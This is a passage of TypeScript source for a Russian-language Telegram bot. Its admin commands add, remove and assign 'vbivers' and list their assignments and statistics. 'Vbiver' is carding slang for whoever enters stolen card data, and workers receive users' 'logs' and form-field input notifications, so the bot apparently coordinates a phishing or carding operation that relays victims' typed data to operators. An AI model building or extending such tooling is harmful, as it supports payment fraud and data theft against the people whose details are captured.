      } catch (error) {
        console.error(
          `Failed to send field input notification to ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error sending field input notification:", error);
  }
}

// Admin command to add worker
bot.onText(/\/addworker (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "❌ У вас нет прав для выполнения этой команды.");
    return;
  }

  if (!workerId) {
    await bot.sendMessage(chatId, "❌ Укажите Telegram ID вбивера.\n\nПример: /addworker 123456789");
    return;
  }

  try {
    // Check if user exists
    const existingUser = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, workerId));

    if (existingUser.length === 0) {
      await bot.sendMessage(chatId, `❌ Пользователь с ID ${workerId} не найден в системе.`);
      return;
    }

    // Update user role to worker
    await db
      .update(telegramUsers)
      .set({ role: "worker" })
      .where(eq(telegramUsers.telegramId, workerId));

    await bot.sendMessage(
      chatId,
      `✅ Пользователь ${workerId} назначен вбивером!\n\n` +
      `👤 Теперь он будет получать уведомления от назначенных пользователей.`,
      adminKeyboard
    );

    // Notify the new worker
    await bot.sendMessage(
      workerId,
      `🎉 Вы назначены вбивером!\n\n` +
      `📋 Теперь вы будете получать уведомления о логах пользователей.\n` +
      `📞 Для вопросов обращайтесь к администратору.`
    );
  } catch (error) {
    console.error("Error adding worker:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при добавлении вбивера.");
  }
});

// Admin command to remove worker
bot.onText(/\/removeworker (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "❌ У вас нет прав для выполнения этой команды.");
    return;
  }

  if (!workerId) {
    await bot.sendMessage(chatId, "❌ Укажите Telegram ID вбивера.\n\nПример: /removeworker 123456789");
    return;
  }

  try {
    // Remove all assignments for this worker
    await db
      .delete(workerAssignments)
      .where(eq(workerAssignments.workerId, workerId));

    // Update user role back to user
    await db
      .update(telegramUsers)
      .set({ role: "user" })
      .where(eq(telegramUsers.telegramId, workerId));

    await bot.sendMessage(
      chatId,
      `✅ Пользователь ${workerId} больше не вбивер!\n\n` +
      `📋 Все его назначения удалены.`,
      adminKeyboard
    );

    // Notify the removed worker
    await bot.sendMessage(
      workerId,
      `📋 Вы больше не являетесь вбивером.\n\n` +
      `📞 Для вопросов обращайтесь к администратору.`
    );
  } catch (error) {
    console.error("Error removing worker:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при удалении вбивера.");
  }
});

// Admin command to assign worker to user
bot.onText(/\/assignworker (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();
  const userId = match?.[2]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "❌ У вас нет прав для выполнения этой команды.");
    return;
  }

  if (!workerId || !userId) {
    await bot.sendMessage(chatId, "❌ Укажите Telegram ID вбивера и пользователя.\n\nПример: /assignworker 123456789 987654321");
    return;
  }

  try {
    // Check if both users exist
    const worker = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, workerId));

    const user = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, userId));

    if (worker.length === 0 || worker[0].role !== "worker") {
      await bot.sendMessage(chatId, `❌ Пользователь ${workerId} не является вбивером.`);
      return;
    }

    if (user.length === 0) {
      await bot.sendMessage(chatId, `❌ Пользователь ${userId} не найден в системе.`);
      return;
    }

    // Check if assignment already exists
    const existingAssignment = await db
      .select()
      .from(workerAssignments)
      .where(
        and(
          eq(workerAssignments.workerId, workerId),
          eq(workerAssignments.userId, userId)
        )
      );

    if (existingAssignment.length > 0) {
      await bot.sendMessage(chatId, `❌ Вбивер ${workerId} уже назначен пользователю ${userId}.`);
      return;
    }

    // Create assignment
    await db.insert(workerAssignments).values({
      workerId,
      userId,
      assignedBy: telegramId,
    });

    await bot.sendMessage(
      chatId,
      `✅ Назначение создано!\n\n` +
      `👤 Вбивер: ${workerId}\n` +
      `📋 Пользователь: ${userId}\n\n` +
      `📧 Теперь вбивер будет получать уведомления от этого пользователя.`,
      adminKeyboard
    );
  } catch (error) {
    console.error("Error assigning worker:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при назначении вбивера.");
  }
});

// Admin command to unassign worker from user
bot.onText(/\/unassignworker (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();
  const userId = match?.[2]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "❌ У вас нет прав для выполнения этой команды.");
    return;
  }

  if (!workerId || !userId) {
    await bot.sendMessage(chatId, "❌ Укажите Telegram ID вбивера и пользователя.\n\nПример: /unassignworker 123456789 987654321");
    return;
  }

  try {
    // Remove assignment
    await db
      .delete(workerAssignments)
      .where(
        and(
          eq(workerAssignments.workerId, workerId),
          eq(workerAssignments.userId, userId)
        )
      );

    await bot.sendMessage(
      chatId,
      `✅ Назначение отменено!\n\n` +
      `👤 Вбивер: ${workerId}\n` +
      `📋 Пользователь: ${userId}\n\n` +
      `📧 Вбивер больше не будет получать уведомления от этого пользователя.`,
      adminKeyboard
    );
  } catch (error) {
    console.error("Error unassigning worker:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при отмене назначения.");
  }
});

// Admin command to list all assignments
bot.onText(/\/listassignments/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "❌ У вас нет прав для выполнения этой команды.");
    return;
  }

  try {
    const assignments = await db
      .select()
      .from(workerAssignments);

    if (assignments.length === 0) {
      await bot.sendMessage(chatId, "📋 Нет активных назначений.", adminKeyboard);
      return;
    }

    const assignmentsList = assignments.map((assignment, index) => 
      `${index + 1}. 👤 ${assignment.workerId} → 📋 ${assignment.userId}`
    ).join('\n');

    await bot.sendMessage(
      chatId,
      `📋 **АКТИВНЫЕ НАЗНАЧЕНИЯ**\n\n${assignmentsList}\n\n` +
      `📊 Всего назначений: ${assignments.length}`,
      { parse_mode: 'Markdown', reply_markup: adminKeyboard.reply_markup }
    );
  } catch (error) {
    console.error("Error listing assignments:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при получении списка назначений.");
  }
});

// Admin command to show worker stats
bot.onText(/\/workerstats/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "❌ У вас нет прав для выполнения этой команды.");
    return;
  }

  try {
    const workers = await getAllWorkers();
    const assignments = await db.select().from(workerAssignments);

    const workerStats = workers.map(workerId => {
      const assignedCount = assignments.filter(a => a.workerId === workerId).length;
      return `👤 ${workerId}: ${assignedCount} назначений`;
    }).join('\n');

    await bot.sendMessage(
      chatId,
      `📊 **СТАТИСТИКА ВБИВЕРОВ**\n\n` +
      `👥 Всего вбиверов: ${workers.length}\n` +
      `📋 Всего назначений: ${assignments.length}\n\n` +
      `📈 Детализация:\n${workerStats || 'Нет данных'}`,
      { parse_mode: 'Markdown', reply_markup: adminKeyboard.reply_markup }
    );
  } catch (error) {
    console.error("Error getting worker stats:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при получении статистики.");
  }
});

console.log("✅ Telegram bot started successfully!");
console.log("Bot token:", VERIFIED_BOT_TOKEN.substring(0, 20) + "...");

export default bot;
